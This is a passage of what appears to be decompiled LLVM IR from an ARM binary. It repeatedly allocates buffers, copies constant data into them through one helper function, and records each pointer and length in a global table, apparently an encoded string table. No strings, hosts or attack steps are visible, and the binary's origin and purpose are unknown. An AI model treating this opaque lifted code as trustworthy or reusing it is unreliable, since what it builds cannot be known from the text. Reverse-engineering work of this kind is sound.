  %v0_13188 = load i32, i32* %r6.global-to-local, align 4
  %v1_13188 = trunc i32 %v0_13188 to i8
  store i8 %v1_13188, i8* bitcast (i32* @global_var_1cd99.406 to i8*), align 4
  %v1_1318c = call i32* @malloc(i32 14)
  %v3_1318c = ptrtoint i32* %v1_1318c to i32
  store i32 %v3_1318c, i32* %r7.global-to-local, align 4
  %v4_1319c = call i32 @function_13a18(i32 %v3_1318c, i32 ptrtoint ([15 x i8]* @global_var_145bc.408 to i32), i32 14)
  store i32 14, i32* %r3.global-to-local, align 4
  %v0_131a4 = load i32, i32* %r5.global-to-local, align 4
  store i8 14, i8* bitcast (i32* @global_var_1ce08.409 to i8*), align 4
  %v0_131ac = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_131ac, i32* @global_var_1ce04.410, align 4
  %v0_131b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_131b0 = trunc i32 %v0_131b0 to i8
  store i8 %v1_131b0, i8* bitcast (i32* @global_var_1ce09.411 to i8*), align 4
  %v1_131b4 = call i32* @malloc(i32 %v0_131a4)
  %v3_131b4 = ptrtoint i32* %v1_131b4 to i32
  %v0_131b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v3_131b4, i32* %r7.global-to-local, align 4
  %v3_131c4 = call i32 @function_13a18(i32 %v3_131b4, i32 ptrtoint (i32* @global_var_145cc.413 to i32), i32 %v0_131b8)
  %v0_131cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_131cc, i32* @global_var_1ce0c.414, align 4
  %v0_131d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_131d0 = trunc i32 %v0_131d0 to i8
  store i8 %v1_131d0, i8* bitcast (i32* @global_var_1ce10.415 to i8*), align 4
  %v0_131d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_131d4 = trunc i32 %v0_131d4 to i8
  store i8 %v1_131d4, i8* bitcast (i32* @global_var_1ce11.416 to i8*), align 4
  %v1_131d8 = call i32* @malloc(i32 15)
  %v3_131d8 = ptrtoint i32* %v1_131d8 to i32
  store i32 %v3_131d8, i32* %r5.global-to-local, align 4
  %v3_131e8 = call i32 @function_13a18(i32 %v3_131d8, i32 ptrtoint (i32* @global_var_145d0.418 to i32), i32 15)
  store i32 15, i32* %r3.global-to-local, align 4
  store i8 15, i8* bitcast (i32* @global_var_1cd88.419 to i8*), align 4
  %v0_131f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_131f8, i32* @global_var_1cd84.420, align 4
  %v0_131fc = load i32, i32* %r6.global-to-local, align 4
  %v1_131fc = trunc i32 %v0_131fc to i8
  store i8 %v1_131fc, i8* bitcast (i32* @global_var_1cd89.421 to i8*), align 4
  %v1_13200 = call i32* @malloc(i32 29)
  %v3_13200 = ptrtoint i32* %v1_13200 to i32
  store i32 %v3_13200, i32* %r5.global-to-local, align 4
  %v3_13210 = call i32 @function_13a18(i32 %v3_13200, i32 ptrtoint (i32* @global_var_145e0.423 to i32), i32 29)
  store i32 29, i32* %r3.global-to-local, align 4
  store i8 29, i8* bitcast (i32* @global_var_1cda0.424 to i8*), align 4
  %v0_13220 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13220, i32* @global_var_1cd9c.425, align 4
  %v0_13224 = load i32, i32* %r6.global-to-local, align 4
  %v1_13224 = trunc i32 %v0_13224 to i8
  store i8 %v1_13224, i8* bitcast (i32* @global_var_1cda1.426 to i8*), align 4
  %v1_13228 = call i32* @malloc(i32 7)
  %v2_13228 = ptrtoint i32* %v1_13228 to i32
  store i32 7, i32* %r7.global-to-local, align 4
  store i32 %v2_13228, i32* %r5.global-to-local, align 4
  %v4_1323c = call i32 @function_13a18(i32 %v2_13228, i32 ptrtoint ([8 x i8]* @global_var_14600.428 to i32), i32 7)
  %v0_13244 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13244, i32* @global_var_1cda4.429, align 4
  %v0_13248 = load i32, i32* %r7.global-to-local, align 4
  %v1_13248 = trunc i32 %v0_13248 to i8
  store i8 %v1_13248, i8* bitcast (i32* @global_var_1cda8.430 to i8*), align 4
  %v0_1324c = load i32, i32* %r6.global-to-local, align 4
  %v1_1324c = trunc i32 %v0_1324c to i8
  store i8 %v1_1324c, i8* bitcast (i32* @global_var_1cda9.431 to i8*), align 4
  %v1_13250 = call i32* @malloc(i32 5)
  %v3_13250 = ptrtoint i32* %v1_13250 to i32
  store i32 %v3_13250, i32* %r5.global-to-local, align 4
  %v4_13260 = call i32 @function_13a18(i32 %v3_13250, i32 ptrtoint ([6 x i8]* @global_var_14608.433 to i32), i32 5)
  store i32 5, i32* %r3.global-to-local, align 4
  store i8 5, i8* bitcast (i32* @global_var_1cdb0.434 to i8*), align 4
  %v0_13270 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13270, i32* @global_var_1cdac.435, align 4
  %v0_13274 = load i32, i32* %r6.global-to-local, align 4
  %v1_13274 = trunc i32 %v0_13274 to i8
  store i8 %v1_13274, i8* bitcast (i32* @global_var_1cdb1.436 to i8*), align 4
  %v1_13278 = call i32* @malloc(i32 11)
  %v3_13278 = ptrtoint i32* %v1_13278 to i32
  store i32 11, i32* %fp.global-to-local, align 4
  store i32 %v3_13278, i32* %r5.global-to-local, align 4
  %v3_1328c = call i32 @function_13a18(i32 %v3_13278, i32 ptrtoint (i32* @global_var_14610.438 to i32), i32 11)
  %v0_13294 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13294, i32* @global_var_1cdb4.439, align 4
  store i8 11, i8* bitcast (i32* @global_var_1cdb8.440 to i8*), align 4
  %v0_1329c = load i32, i32* %r6.global-to-local, align 4
  %v1_1329c = trunc i32 %v0_1329c to i8
  store i8 %v1_1329c, i8* bitcast (i32* @global_var_1cdb9.441 to i8*), align 4
  %v1_132a0 = call i32* @malloc(i32 4)
  %v3_132a0 = ptrtoint i32* %v1_132a0 to i32
  store i32 %v3_132a0, i32* %r5.global-to-local, align 4
  %v4_132b0 = call i32 @function_13a18(i32 %v3_132a0, i32 ptrtoint ([5 x i8]* @global_var_1461c.443 to i32), i32 4)
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_132b8 = load i32, i32* %r7.global-to-local, align 4
  store i8 4, i8* bitcast (i32* @global_var_1cdc0.444 to i8*), align 4
  %v0_132c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_132c0, i32* @global_var_1cdbc.445, align 4
  %v0_132c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_132c4 = trunc i32 %v0_132c4 to i8
  store i8 %v1_132c4, i8* bitcast (i32* @global_var_1cdc1.446 to i8*), align 4
  %v1_132c8 = call i32* @malloc(i32 %v0_132b8)
  %v3_132c8 = ptrtoint i32* %v1_132c8 to i32
  %v0_132cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_132c8, i32* %r5.global-to-local, align 4
  %v4_132d8 = call i32 @function_13a18(i32 %v3_132c8, i32 ptrtoint ([8 x i8]* @global_var_14624.448 to i32), i32 %v0_132cc)
  %v0_132e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_132e0, i32* @global_var_1cdc4.449, align 4
  %v0_132e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_132e4 = trunc i32 %v0_132e4 to i8
  store i8 %v1_132e4, i8* bitcast (i32* @global_var_1cdc8.450 to i8*), align 4
  %v0_132e8 = load i32, i32* %r6.global-to-local, align 4
  %v1_132e8 = trunc i32 %v0_132e8 to i8
  store i8 %v1_132e8, i8* bitcast (i32* @global_var_1cdc9.451 to i8*), align 4
  %v1_132ec = call i32* @malloc(i32 8)
  %v3_132ec = ptrtoint i32* %v1_132ec to i32
  store i32 %v3_132ec, i32* %r5.global-to-local, align 4
  %v4_132fc = call i32 @function_13a18(i32 %v3_132ec, i32 ptrtoint ([9 x i8]* @global_var_1462c.453 to i32), i32 8)
  store i32 8, i32* %r3.global-to-local, align 4
  store i8 8, i8* bitcast (i32* @global_var_1cdd0.454 to i8*), align 4
  %v0_1330c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1330c, i32* @global_var_1cdcc.455, align 4
  %v0_13310 = load i32, i32* %r6.global-to-local, align 4
  %v1_13310 = trunc i32 %v0_13310 to i8
  store i8 %v1_13310, i8* bitcast (i32* @global_var_1cdd1.456 to i8*), align 4
  %v1_13314 = call i32* @malloc(i32 13)
  %v3_13314 = ptrtoint i32* %v1_13314 to i32
  store i32 %v3_13314, i32* %r5.global-to-local, align 4
  %v3_13324 = call i32 @function_13a18(i32 %v3_13314, i32 ptrtoint (i32* @global_var_14638.458 to i32), i32 13)
  store i32 13, i32* %r3.global-to-local, align 4
  store i8 13, i8* bitcast (i32* @global_var_1cdd8.459 to i8*), align 4
  %v0_13334 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13334, i32* @global_var_1cdd4.460, align 4
  %v0_13338 = load i32, i32* %r6.global-to-local, align 4
  %v1_13338 = trunc i32 %v0_13338 to i8
  store i8 %v1_13338, i8* bitcast (i32* @global_var_1cdd9.461 to i8*), align 4
  %v1_1333c = call i32* @malloc(i32 10)
  %v3_1333c = ptrtoint i32* %v1_1333c to i32
  store i32 10, i32* %r8.global-to-local, align 4
  store i32 %v3_1333c, i32* %r5.global-to-local, align 4
  %v4_13350 = call i32 @function_13a18(i32 %v3_1333c, i32 ptrtoint ([11 x i8]* @global_var_14648.463 to i32), i32 10)
  %v0_13358 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13358, i32* @global_var_1cddc.464, align 4
  store i8 10, i8* bitcast (i32* @global_var_1cde0.465 to i8*), align 4
  %v0_13360 = load i32, i32* %r6.global-to-local, align 4
  %v1_13360 = trunc i32 %v0_13360 to i8
  store i8 %v1_13360, i8* bitcast (i32* @global_var_1cde1.466 to i8*), align 4
  %v1_13364 = call i32* @malloc(i32 10)
  %v3_13364 = ptrtoint i32* %v1_13364 to i32
  %v0_1336c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v3_13364, i32* %r5.global-to-local, align 4
  %v4_13374 = call i32 @function_13a18(i32 %v3_13364, i32 ptrtoint ([11 x i8]* @global_var_14654.468 to i32), i32 %v0_1336c)
  %v0_1337c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1337c, i32* @global_var_1cde4.469, align 4
  %v1_13380 = trunc i32 %v0_1336c to i8
  store i8 %v1_13380, i8* bitcast (i32* @global_var_1cde8.470 to i8*), align 4
  %v0_13384 = load i32, i32* %r6.global-to-local, align 4
  %v1_13384 = trunc i32 %v0_13384 to i8
  store i8 %v1_13384, i8* bitcast (i32* @global_var_1cde9.471 to i8*), align 4
  %v1_13388 = call i32* @malloc(i32 33)
  %v3_13388 = ptrtoint i32* %v1_13388 to i32
  store i32 %v3_13388, i32* %r5.global-to-local, align 4
  %v3_13398 = call i32 @function_13a18(i32 %v3_13388, i32 ptrtoint (i32* @global_var_14660.473 to i32), i32 33)
  store i32 33, i32* %r3.global-to-local, align 4
  store i8 33, i8* bitcast (i32* @global_var_1cdf0.474 to i8*), align 4
  %v0_133a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_133a8, i32* @global_var_1cdec.475, align 4
  %v0_133ac = load i32, i32* %r6.global-to-local, align 4
  %v1_133ac = trunc i32 %v0_133ac to i8
  store i8 %v1_133ac, i8* bitcast (i32* @global_var_1cdf1.476 to i8*), align 4
  %v1_133b0 = call i32* @malloc(i32 8)
  %v3_133b0 = ptrtoint i32* %v1_133b0 to i32
  store i32 %v3_133b0, i32* %r5.global-to-local, align 4
  %v4_133c0 = call i32 @function_13a18(i32 %v3_133b0, i32 ptrtoint ([9 x i8]* @global_var_14684.478 to i32), i32 8)
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_133c8 = load i32, i32* %fp.global-to-local, align 4
  store i8 8, i8* bitcast (i32* @global_var_1cdf8.479 to i8*), align 4
  %v0_133d0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_133d0, i32* @global_var_1cdf4.480, align 4
  %v0_133d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_133d4 = trunc i32 %v0_133d4 to i8
  store i8 %v1_133d4, i8* bitcast (i32* @global_var_1cdf9.481 to i8*), align 4
  %v1_133d8 = call i32* @malloc(i32 %v0_133c8)
  %v3_133d8 = ptrtoint i32* %v1_133d8 to i32
  %v0_133e0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v3_133d8, i32* %r5.global-to-local, align 4
  %v4_133e8 = call i32 @function_13a18(i32 %v3_133d8, i32 ptrtoint ([12 x i8]* @global_var_14690.483 to i32), i32 %v0_133e0)
  %v0_133f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_133f0, i32* @global_var_1cdfc.484, align 4
  %v1_133f4 = trunc i32 %v0_133e0 to i8
  store i8 %v1_133f4, i8* bitcast (i32* @global_var_1ce00.485 to i8*), align 4
  %v0_133f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_133f8 = trunc i32 %v0_133f8 to i8
  store i8 %v1_133f8, i8* bitcast (i32* @global_var_1ce01.486 to i8*), align 4
  %v1_133fc = call i32* @malloc(i32 6)
  %v3_133fc = ptrtoint i32* %v1_133fc to i32
  store i32 %v3_133fc, i32* %r5.global-to-local, align 4
  %v4_1340c = call i32 @function_13a18(i32 %v3_133fc, i32 ptrtoint ([7 x i8]* @global_var_1469c.488 to i32), i32 6)
  store i32 6, i32* %r3.global-to-local, align 4
  %v0_13414 = load i32, i32* %r7.global-to-local, align 4
  store i8 6, i8* bitcast (i32* @global_var_1ce18.489 to i8*), align 4
  %v0_1341c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1341c, i32* @global_var_1ce14.490, align 4
  %v0_13420 = load i32, i32* %r6.global-to-local, align 4
  %v1_13420 = trunc i32 %v0_13420 to i8
  store i8 %v1_13420, i8* bitcast (i32* @global_var_1ce19.491 to i8*), align 4
  %v1_13424 = call i32* @malloc(i32 %v0_13414)
  %v3_13424 = ptrtoint i32* %v1_13424 to i32
  %v0_13428 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_13424, i32* %r5.global-to-local, align 4
  %v4_13434 = call i32 @function_13a18(i32 %v3_13424, i32 ptrtoint ([8 x i8]* @global_var_146a4.493 to i32), i32 %v0_13428)
  %v0_13438 = load i32, i32* %r7.global-to-local, align 4
  %v0_1343c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1343c, i32* @global_var_1ce1c.494, align 4
  %v1_13440 = trunc i32 %v0_13438 to i8
  store i8 %v1_13440, i8* bitcast (i32* @global_var_1ce20.495 to i8*), align 4
  %v0_13444 = load i32, i32* %r6.global-to-local, align 4
  %v1_13444 = trunc i32 %v0_13444 to i8
  store i8 %v1_13444, i8* bitcast (i32* @global_var_1ce21.496 to i8*), align 4
  %v1_13448 = call i32* @malloc(i32 %v0_13438)
  %v3_13448 = ptrtoint i32* %v1_13448 to i32
  %v0_1344c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_13448, i32* %r5.global-to-local, align 4
  %v4_13458 = call i32 @function_13a18(i32 %v3_13448, i32 ptrtoint ([8 x i8]* @global_var_146ac.498 to i32), i32 %v0_1344c)
  %v0_13460 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13460, i32* @global_var_1ce24.499, align 4
  %v0_13464 = load i32, i32* %r7.global-to-local, align 4
  %v1_13464 = trunc i32 %v0_13464 to i8
  store i8 %v1_13464, i8* bitcast (i32* @global_var_1ce28.500 to i8*), align 4
  %v0_13468 = load i32, i32* %r6.global-to-local, align 4
  %v1_13468 = trunc i32 %v0_13468 to i8
  store i8 %v1_13468, i8* bitcast (i32* @global_var_1ce29.501 to i8*), align 4
  %v1_1346c = call i32* @malloc(i32 3)
  %v3_1346c = ptrtoint i32* %v1_1346c to i32
  store i32 %v3_1346c, i32* %r5.global-to-local, align 4
  %v4_1347c = call i32 @function_13a18(i32 %v3_1346c, i32 ptrtoint ([4 x i8]* @global_var_146b4.503 to i32), i32 3)
  store i32 3, i32* %r3.global-to-local, align 4
  store i8 3, i8* bitcast (i32* @global_var_1ce30.504 to i8*), align 4
  %v0_1348c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1348c, i32* @global_var_1ce2c.505, align 4
  %v0_13490 = load i32, i32* %r6.global-to-local, align 4
  %v1_13490 = trunc i32 %v0_13490 to i8
  store i8 %v1_13490, i8* bitcast (i32* @global_var_1ce31.506 to i8*), align 4
  %v1_13494 = call i32* @malloc(i32 19)
  %v3_13494 = ptrtoint i32* %v1_13494 to i32
  store i32 %v3_13494, i32* %r5.global-to-local, align 4
  store i32 19, i32* %sl.global-to-local, align 4
  %v3_134a8 = call i32 @function_13a18(i32 %v3_13494, i32 ptrtoint (i32* @global_var_146b8.508 to i32), i32 19)
  %v0_134b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_134b0, i32* @global_var_1ce34.509, align 4
  store i8 19, i8* bitcast (i32* @global_var_1ce38.510 to i8*), align 4
  %v0_134b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_134b8 = trunc i32 %v0_134b8 to i8
  store i8 %v1_134b8, i8* bitcast (i32* @global_var_1ce39.511 to i8*), align 4
  %v1_134bc = call i32* @malloc(i32 24)
  %v3_134bc = ptrtoint i32* %v1_134bc to i32
  store i32 %v3_134bc, i32* %r5.global-to-local, align 4
  %v3_134cc = call i32 @function_13a18(i32 %v3_134bc, i32 ptrtoint (i32* @global_var_146cc.513 to i32), i32 24)
  store i32 24, i32* %r3.global-to-local, align 4
  store i8 24, i8* bitcast (i32* @global_var_1ce40.514 to i8*), align 4
  %v0_134dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_134dc, i32* @global_var_1ce3c.515, align 4
  %v0_134e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_134e0 = trunc i32 %v0_134e0 to i8
  store i8 %v1_134e0, i8* bitcast (i32* @global_var_1ce41.516 to i8*), align 4
  %v1_134e4 = call i32* @malloc(i32 9)
  %v3_134e4 = ptrtoint i32* %v1_134e4 to i32
  store i32 %v3_134e4, i32* %r5.global-to-local, align 4
  %v4_134f4 = call i32 @function_13a18(i32 %v3_134e4, i32 ptrtoint ([10 x i8]* @global_var_146e8.518 to i32), i32 9)
  store i32 9, i32* %r3.global-to-local, align 4
  store i8 9, i8* bitcast (i32* @global_var_1ce48.519 to i8*), align 4
  %v0_13504 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13504, i32* @global_var_1ce44.520, align 4
  %v0_13508 = load i32, i32* %r6.global-to-local, align 4
  %v1_13508 = trunc i32 %v0_13508 to i8
  store i8 %v1_13508, i8* bitcast (i32* @global_var_1ce49.521 to i8*), align 4
  %v1_1350c = call i32* @malloc(i32 16)
  %v3_1350c = ptrtoint i32* %v1_1350c to i32
  store i32 %v3_1350c, i32* %r5.global-to-local, align 4
  store i32 16, i32* %sb.global-to-local, align 4
  %v3_13520 = call i32 @function_13a18(i32 %v3_1350c, i32 ptrtoint (i32* @global_var_146f4.523 to i32), i32 16)
  %v0_13528 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13528, i32* @global_var_1ce4c.524, align 4
  store i8 16, i8* bitcast (i32* @global_var_1ce50.525 to i8*), align 4
  %v0_13530 = load i32, i32* %r6.global-to-local, align 4
  %v1_13530 = trunc i32 %v0_13530 to i8
  store i8 %v1_13530, i8* bitcast (i32* @global_var_1ce51.526 to i8*), align 4
  %v1_13534 = call i32* @malloc(i32 22)
  %v3_13534 = ptrtoint i32* %v1_13534 to i32
  store i32 %v3_13534, i32* %r5.global-to-local, align 4
  %v3_13544 = call i32 @function_13a18(i32 %v3_13534, i32 ptrtoint (i32* @global_var_14708.528 to i32), i32 22)
  store i32 22, i32* %r3.global-to-local, align 4
  store i8 22, i8* bitcast (i32* @global_var_1ce58.529 to i8*), align 4
  %v0_13554 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13554, i32* @global_var_1ce54.530, align 4
  %v0_13558 = load i32, i32* %r6.global-to-local, align 4
  %v1_13558 = trunc i32 %v0_13558 to i8
  store i8 %v1_13558, i8* bitcast (i32* @global_var_1ce59.531 to i8*), align 4
  %v1_1355c = call i32* @malloc(i32 21)
  %v3_1355c = ptrtoint i32* %v1_1355c to i32
  store i32 %v3_1355c, i32* %r5.global-to-local, align 4
  %v3_1356c = call i32 @function_13a18(i32 %v3_1355c, i32 ptrtoint (i32* @global_var_14720.533 to i32), i32 21)
  store i32 21, i32* %r3.global-to-local, align 4
  store i8 21, i8* bitcast (i32* @global_var_1ce60.534 to i8*), align 4
  %v0_1357c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1357c, i32* @global_var_1ce5c.535, align 4
  %v0_13580 = load i32, i32* %r6.global-to-local, align 4
  %v1_13580 = trunc i32 %v0_13580 to i8
  store i8 %v1_13580, i8* bitcast (i32* @global_var_1ce61.536 to i8*), align 4
  %v1_13584 = call i32* @malloc(i32 17)
  %v3_13584 = ptrtoint i32* %v1_13584 to i32
  store i32 %v3_13584, i32* %r5.global-to-local, align 4
  %v4_13594 = call i32 @function_13a18(i32 %v3_13584, i32 ptrtoint ([18 x i8]* @global_var_14738.538 to i32), i32 17)
  store i32 17, i32* %r3.global-to-local, align 4
  store i8 17, i8* bitcast (i32* @global_var_1ce68.539 to i8*), align 4
  %v0_135a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_135a4, i32* @global_var_1ce64.540, align 4
  %v0_135a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_135a8 = trunc i32 %v0_135a8 to i8
  store i8 %v1_135a8, i8* bitcast (i32* @global_var_1ce69.541 to i8*), align 4
  %v1_135ac = call i32* @malloc(i32 12)
  %v2_135ac = ptrtoint i32* %v1_135ac to i32
  %v0_135b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_135b8 = add i32 %v0_135b8, 5
  store i32 %v1_135b8, i32* %r7.global-to-local, align 4
  store i32 %v2_135ac, i32* %r5.global-to-local, align 4
  %v3_135c0 = call i32 @function_13a18(i32 %v2_135ac, i32 ptrtoint (i32* @global_var_1474c.543 to i32), i32 12)
  %v0_135c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_135c8, i32* @global_var_1ce6c.544, align 4
  %v0_135cc = load i32, i32* %r7.global-to-local, align 4
  %v1_135cc = trunc i32 %v0_135cc to i8
  store i8 %v1_135cc, i8* bitcast (i32* @global_var_1ce70.545 to i8*), align 4
  %v0_135d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_135d0 = trunc i32 %v0_135d0 to i8
  store i8 %v1_135d0, i8* bitcast (i32* @global_var_1ce71.546 to i8*), align 4
  %v1_135d4 = call i32* @malloc(i32 23)
  %v3_135d4 = ptrtoint i32* %v1_135d4 to i32
  store i32 %v3_135d4, i32* %r5.global-to-local, align 4
  %v3_135e4 = call i32 @function_13a18(i32 %v3_135d4, i32 ptrtoint (i32* @global_var_1475c.548 to i32), i32 23)
  store i32 23, i32* %r3.global-to-local, align 4
  store i8 23, i8* bitcast (i32* @global_var_1ce78.549 to i8*), align 4
  %v0_135f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_135f4, i32* @global_var_1ce74.550, align 4
  %v0_135f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_135f8 = trunc i32 %v0_135f8 to i8
  store i8 %v1_135f8, i8* bitcast (i32* @global_var_1ce79.551 to i8*), align 4
  %v1_135fc = call i32* @malloc(i32 83)
  %v3_135fc = ptrtoint i32* %v1_135fc to i32
  store i32 %v3_135fc, i32* %r5.global-to-local, align 4
  %v3_1360c = call i32 @function_13a18(i32 %v3_135fc, i32 ptrtoint (i32* @global_var_14774.553 to i32), i32 83)
  store i32 83, i32* %r3.global-to-local, align 4
  store i8 83, i8* bitcast (i32* @global_var_1ce80.554 to i8*), align 4
  %v0_1361c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1361c, i32* @global_var_1ce7c.555, align 4
  %v0_13620 = load i32, i32* %r6.global-to-local, align 4
  %v1_13620 = trunc i32 %v0_13620 to i8
  store i8 %v1_13620, i8* bitcast (i32* @global_var_1ce81.556 to i8*), align 4
  %v1_13624 = call i32* @malloc(i32 32)
  %v3_13624 = ptrtoint i32* %v1_13624 to i32
  store i32 %v3_13624, i32* %r5.global-to-local, align 4
  %v3_13634 = call i32 @function_13a18(i32 %v3_13624, i32 ptrtoint (i32* @global_var_147c8.558 to i32), i32 32)
  store i32 32, i32* %r3.global-to-local, align 4
  store i8 32, i8* bitcast (i32* @global_var_1ce88.559 to i8*), align 4
  %v0_13644 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13644, i32* @global_var_1ce84.560, align 4
  %v0_13648 = load i32, i32* %r6.global-to-local, align 4
  %v1_13648 = trunc i32 %v0_13648 to i8
  store i8 %v1_13648, i8* bitcast (i32* @global_var_1ce89.561 to i8*), align 4
  %v1_1364c = call i32* @malloc(i32 48)
  %v3_1364c = ptrtoint i32* %v1_1364c to i32
  store i32 %v3_1364c, i32* %r5.global-to-local, align 4
  %v3_1365c = call i32 @function_13a18(i32 %v3_1364c, i32 ptrtoint (i32* @global_var_147ec.563 to i32), i32 48)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_13664 = load i32, i32* %r7.global-to-local, align 4
  store i8 48, i8* bitcast (i32* @global_var_1ce90.564 to i8*), align 4
  %v0_1366c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1366c, i32* @global_var_1ce8c.565, align 4
  %v0_13670 = load i32, i32* %r6.global-to-local, align 4
  %v1_13670 = trunc i32 %v0_13670 to i8
  store i8 %v1_13670, i8* bitcast (i32* @global_var_1ce91.566 to i8*), align 4
  %v1_13674 = call i32* @malloc(i32 %v0_13664)
  %v3_13674 = ptrtoint i32* %v1_13674 to i32
  %v0_13678 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_13674, i32* %r5.global-to-local, align 4
  %v3_13684 = call i32 @function_13a18(i32 %v3_13674, i32 ptrtoint (i32* @global_var_14820.568 to i32), i32 %v0_13678)
  %v0_1368c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1368c, i32* @global_var_1ce94.569, align 4
  %v0_13690 = load i32, i32* %r7.global-to-local, align 4
  %v1_13690 = trunc i32 %v0_13690 to i8
  store i8 %v1_13690, i8* bitcast (i32* @global_var_1ce98.570 to i8*), align 4
  %v0_13694 = load i32, i32* %r6.global-to-local, align 4
  %v1_13694 = trunc i32 %v0_13694 to i8
  store i8 %v1_13694, i8* bitcast (i32* @global_var_1ce99.571 to i8*), align 4
  %v1_13698 = call i32* @malloc(i32 9)
  %v3_13698 = ptrtoint i32* %v1_13698 to i32
  store i32 %v3_13698, i32* %r5.global-to-local, align 4
  %v3_136a8 = call i32 @function_13a18(i32 %v3_13698, i32 ptrtoint (i32* @global_var_14830.573 to i32), i32 9)
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_136b0 = load i32, i32* %r8.global-to-local, align 4
  store i8 9, i8* bitcast (i32* @global_var_1cea0.574 to i8*), align 4
  %v0_136b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_136b8, i32* @global_var_1ce9c.575, align 4
  %v0_136bc = load i32, i32* %r6.global-to-local, align 4
  %v1_136bc = trunc i32 %v0_136bc to i8
  store i8 %v1_136bc, i8* bitcast (i32* @global_var_1cea1.576 to i8*), align 4
  %v1_136c0 = call i32* @malloc(i32 %v0_136b0)
  %v3_136c0 = ptrtoint i32* %v1_136c0 to i32
  %v0_136c8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v3_136c0, i32* %r5.global-to-local, align 4
  %v3_136d0 = call i32 @function_13a18(i32 %v3_136c0, i32 ptrtoint (i32* @global_var_1483c.578 to i32), i32 %v0_136c8)
  %v0_136d4 = load i32, i32* %r7.global-to-local, align 4
  %v0_136d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_136d8, i32* @global_var_1cea4.579, align 4
  %v1_136dc = trunc i32 %v0_136c8 to i8
  store i8 %v1_136dc, i8* bitcast (i32* @global_var_1cea8.580 to i8*), align 4
  %v0_136e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_136e0 = trunc i32 %v0_136e0 to i8
  store i8 %v1_136e0, i8* bitcast (i32* @global_var_1cea9.581 to i8*), align 4
  %v1_136e4 = call i32* @malloc(i32 %v0_136d4)
  %v3_136e4 = ptrtoint i32* %v1_136e4 to i32
  %v0_136e8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_136e4, i32* %r5.global-to-local, align 4
  %v3_136f4 = call i32 @function_13a18(i32 %v3_136e4, i32 ptrtoint (i32* @global_var_14848.583 to i32), i32 %v0_136e8)
  %v0_136f8 = load i32, i32* %sb.global-to-local, align 4
  %v0_136fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_136fc, i32* @global_var_1ceac.584, align 4
  %v0_13700 = load i32, i32* %r7.global-to-local, align 4
  %v1_13700 = trunc i32 %v0_13700 to i8
  store i8 %v1_13700, i8* bitcast (i32* @global_var_1ceb0.585 to i8*), align 4
  %v0_13704 = load i32, i32* %r6.global-to-local, align 4
  %v1_13704 = trunc i32 %v0_13704 to i8
  store i8 %v1_13704, i8* bitcast (i32* @global_var_1ceb1.586 to i8*), align 4
  %v1_13708 = call i32* @malloc(i32 %v0_136f8)
  %v3_13708 = ptrtoint i32* %v1_13708 to i32
  %v0_13710 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v3_13708, i32* %r5.global-to-local, align 4
  %v3_13718 = call i32 @function_13a18(i32 %v3_13708, i32 ptrtoint (i32* @global_var_14858.588 to i32), i32 %v0_13710)
  %v0_1371c = load i32, i32* %sl.global-to-local, align 4
  %v0_13720 = load i32, i32* %r5.global-to-local, align 4
